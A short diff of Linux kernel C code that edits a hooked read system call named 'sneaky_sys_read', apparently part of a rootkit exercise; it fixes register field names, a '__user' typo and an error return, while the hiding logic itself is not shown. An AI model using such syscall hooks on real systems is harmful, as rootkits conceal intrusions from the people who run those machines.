@@ -103,14 +103,15 @@ asmlinkage int sneaky_sys_read(struct pt_regs *regs)
 {
   // Implement the sneaky part here
   //return (*original_read)(regs);
-  unsigned int fd = regs->rdi;
-  char __usr* buf = regs->rsi;
-  size_t count = regs->rdx;
+  unsigned int fd = regs->di;
+  char __user * buf = regs->si;
+  size_t count = regs->dx;
   ssize_t nread;
 
   nread = original_read(regs);
   if (nread == -1) {
     printk(KERN_INFO "error: cannot operate original read");
+    return -1;
   }
   else if (nread == 0) {
     return 0;
